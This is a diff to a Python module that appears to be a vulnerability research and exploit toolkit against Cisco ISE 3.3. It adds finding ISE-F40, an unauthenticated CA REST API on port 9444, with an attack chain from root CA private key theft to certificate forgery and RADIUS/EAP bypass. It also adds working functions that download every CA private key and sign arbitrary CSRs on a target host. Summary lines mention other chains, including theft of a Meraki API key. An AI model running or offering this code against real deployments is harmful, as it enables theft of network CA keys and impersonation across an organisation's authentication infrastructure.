@@ -55,6 +55,7 @@ ISE-F36: CTA adapter hardcoded AES-CBC IV ISE_AES_TCNAC_VA + PBKDF2 from MongoDB
 ISE-F37: Redis profiler database on localhost:6379 — no requirepass, no TLS; stores ISE endpoint/profiler data [MEDIUM]
 ISE-F38: resetSystemPasswds() bug — orapwd password=dbstr (missing $) sets Oracle SYS to literal "dbstr" on wallet failure [HIGH]
 ISE-F39: mctrust (Meraki Sync Service) container mounts -v /var/run/:/host/var/run/ with --cap-drop=all — key_manager.sock accessible from bridge-isolated container; Meraki API key recoverable via ISE-F1 chain [HIGH]
+ISE-F40: CA REST API on HTTP port 9444 (Tomcat Connector: no address bind → 0.0.0.0) — zero auth (no web.xml security-constraint, no JAX-RS @RolesAllowed, no Servlet filter); GET /caservice/api/keys/download/ROOT_CA returns ISE root CA private key; POST /cr/sign/{certtype} signs arbitrary CSRs; network-reachable (cpmenv.sh healthcheck uses $MYIP:9444) [CRITICAL]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3235,9 +3236,121 @@ def extract_meraki_api_key_via_decrypt_oracle(
         return {"meraki_api_key_pt": api_key_blob, "encrypted": False}
 
 
+# ISE-F40: CA REST API — unauthenticated cert management on HTTP port 9444 (all interfaces)
+# Source: server.xml (Connector port="9444", scheme="http", no address attr -> 0.0.0.0)
+#         web.xml (no <security-constraint>, no <filter> — zero web-tier auth enforcement)
+#         CaRestServer.class (no @RolesAllowed, no ContainerRequestFilter, no auth annotation)
+#         CertType.class enum: ROOT_CA, INTERMEDIATE_CA, NODE_CA, NODE, EP_CA, OCSP, EP_RA,
+#                              ENDPOINT, EST_SERVER, EST_CLIENT, PXGRID, CONTAINER_SERVER
+#         cpmenv.sh: healthcheck wget http://$MYIP:9444/caservice/scep (non-loopback)
+# REST endpoints (all unauthenticated):
+#   GET  /caservice/api/keys/download/{certtype}   — download CA private key for any CertType
+#   POST /caservice/api/cr/sign/{certtype}         — sign arbitrary PKCS#10 CSR (consumes application/pkcs10)
+#   GET  /caservice/api/certs/list                 — list all issued certificates
+#   POST /caservice/api/certs/revoke               — revoke any certificate
+#   GET  /caservice/api/certs/download/{certtype}  — download certificate DER
+#   GET  /caservice/api/certs/downloadPem/{certtype} — download certificate PEM
+#   GET  /caservice/api/certs/downloadcert/{id}    — download cert by serial/ID
+#   GET  /caservice/api/about                      — version/status
+#   GET  /caservice/api/cr/request/{certtype}      — generate+store keypair, return CSR
+#   POST /caservice/api/certs/create/{certtype}    — create cert (self-signed)
+#   POST /caservice/api/certs/upload/{certtype}    — upload signed cert
+# Attack chain: GET http://<ise>:9444/caservice/api/keys/download/ROOT_CA -> ISE root CA privkey
+#               -> forge any cert in ISE PKI -> RADIUS/EAP bypass, pxGrid impersonation, node impersonation
+# Note: ISE-F16 covers Tomcat manager app credentials (WAR deployment); ISE-F18 covers plaintext HTTP.
+#       ISE-F40 is the auth-bypass surface on the caservice REST API itself.
+
+CA_REST_API_PORT = 9444
+CA_REST_API_BASE = "/caservice/api"
+
+# CertType enum values from com.cisco.cpm.caservice.CertType
+CA_CERT_TYPES = [
+    "ROOT_CA", "INTERMEDIATE_CA", "NODE_CA", "NODE",
+    "EP_CA", "OCSP", "EP_RA", "ENDPOINT",
+    "EST_SERVER", "EST_CLIENT", "PXGRID", "CONTAINER_SERVER",
+]
+
+
+def download_ca_privkey(host: str, certtype: str = "ROOT_CA", port: int = CA_REST_API_PORT) -> dict:
+    """ISE-F40: Download ISE CA private key for certtype via unauthenticated HTTP REST API."""
+    import urllib.request
+    url = f"http://{host}:{port}{CA_REST_API_BASE}/keys/download/{certtype}"
+    try:
+        with urllib.request.urlopen(url, timeout=10) as r:
+            data = r.read()
+            return {
+                "certtype": certtype,
+                "status": r.status,
+                "content_type": r.headers.get("Content-Type", ""),
+                "data_len": len(data),
+                "data_b64": __import__("base64").b64encode(data).decode(),
+                "is_pem": data.startswith(b"-----BEGIN"),
+            }
+    except Exception as e:
+        return {"certtype": certtype, "error": str(e)}
+
+
+def list_ca_certs(host: str, port: int = CA_REST_API_PORT) -> dict:
+    """ISE-F40: List all issued ISE CA certificates via unauthenticated REST API."""
+    import urllib.request, json as _json
+    url = f"http://{host}:{port}{CA_REST_API_BASE}/certs/list"
+    try:
+        with urllib.request.urlopen(url, timeout=10) as r:
+            data = r.read()
+            try:
+                return {"status": r.status, "certs": _json.loads(data)}
+            except Exception:
+                return {"status": r.status, "raw_b64": __import__("base64").b64encode(data).decode()}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def sign_csr_via_ca_api(host: str, csr_pem: bytes, certtype: str = "ENDPOINT",
+                         port: int = CA_REST_API_PORT) -> dict:
+    """ISE-F40: Sign an arbitrary CSR against the ISE CA via unauthenticated REST API.
+
+    csr_pem: PEM-encoded CSR bytes (-----BEGIN CERTIFICATE REQUEST-----)
+    Returns DER-encoded signed certificate or error.
+    """
+    import urllib.request, urllib.error
+    import base64
+    from cryptography.hazmat.primitives.serialization import Encoding
+    from cryptography import x509
+
+    try:
+        csr_obj = x509.load_pem_x509_csr(csr_pem)
+        csr_der = csr_obj.public_bytes(Encoding.DER)
+    except Exception as e:
+        return {"error": f"CSR parse failed: {e}"}
+
+    url = f"http://{host}:{port}{CA_REST_API_BASE}/cr/sign/{certtype}"
+    req = urllib.request.Request(
+        url, data=csr_der, method="POST",
+        headers={"Content-Type": "application/pkcs10"},
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=15) as r:
+            cert_der = r.read()
+            return {
+                "certtype": certtype,
+                "status": r.status,
+                "cert_der_b64": base64.b64encode(cert_der).decode(),
+                "cert_len": len(cert_der),
+            }
+    except urllib.error.HTTPError as e:
+        return {"certtype": certtype, "http_error": e.code, "reason": e.reason}
+    except Exception as e:
+        return {"certtype": certtype, "error": str(e)}
+
+
+def sweep_ca_privkeys(host: str, port: int = CA_REST_API_PORT) -> list:
+    """ISE-F40: Download all CA private keys for every CertType via unauthenticated API."""
+    return [download_ca_privkey(host, ct, port) for ct in CA_CERT_TYPES]
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.18.0",
+    "version": "1.19.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3247,10 +3360,10 @@ MODULE_META = {
         "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
         "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37", "ISE-F38",
-        "ISE-F39",
+        "ISE-F39", "ISE-F40",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
-                 "ISE-F26", "ISE-F31", "ISE-F34"],
+                 "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
              "ISE-F39"],
@@ -3323,6 +3436,19 @@ MODULE_META = {
         "ise_f39_meraki_api_header": "X-Idempotency-Key (Meraki dashboard.meraki.com API)",
         "ise_f39_chain": "mctrust-RCE -> /host/var/run/key_manager.sock -> ISE-F1 decrypt -> Meraki API key -> Meraki org admin",
         "ise_f39_isolation_bypass": "bridge-network + --cap-drop=all provides false isolation; UNIX socket mount breaks it",
+        "ise_f40_port": 9444,
+        "ise_f40_protocol": "HTTP (scheme=http, no TLS)",
+        "ise_f40_bind": "0.0.0.0 (Tomcat Connector has no address attribute)",
+        "ise_f40_auth": "NONE (no web.xml security-constraint, no @RolesAllowed, no filter)",
+        "ise_f40_endpoint_privkey": "GET /caservice/api/keys/download/{certtype}",
+        "ise_f40_endpoint_sign": "POST /caservice/api/cr/sign/{certtype} (consumes application/pkcs10)",
+        "ise_f40_endpoint_list": "GET /caservice/api/certs/list",
+        "ise_f40_endpoint_revoke": "POST /caservice/api/certs/revoke",
+        "ise_f40_cert_types": "ROOT_CA INTERMEDIATE_CA NODE_CA NODE EP_CA OCSP EP_RA ENDPOINT EST_SERVER EST_CLIENT PXGRID CONTAINER_SERVER",
+        "ise_f40_evidence_server_xml": "server.xml: <Connector scheme=\"http\" port=\"9444\" ...> (no address= -> 0.0.0.0)",
+        "ise_f40_evidence_web_xml": "web.xml: no <security-constraint>, no <filter> — caservice API entirely unprotected",
+        "ise_f40_evidence_cpmenv": "cpmenv.sh: healthcheck uses http://$MYIP:9444/caservice/scep (non-loopback)",
+        "ise_f40_chain": "network -> GET /caservice/api/keys/download/ROOT_CA -> ISE root CA privkey -> forge any ISE PKI cert -> RADIUS/EAP bypass / pxGrid impersonation",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3383,5 +3509,9 @@ MODULE_META = {
         "check_oracle_wallet_failure_password",
         "read_mctrust_config",
         "extract_meraki_api_key_via_decrypt_oracle",
+        "download_ca_privkey",
+        "list_ca_certs",
+        "sign_csr_via_ca_api",
+        "sweep_ca_privkeys",
     ],
 }
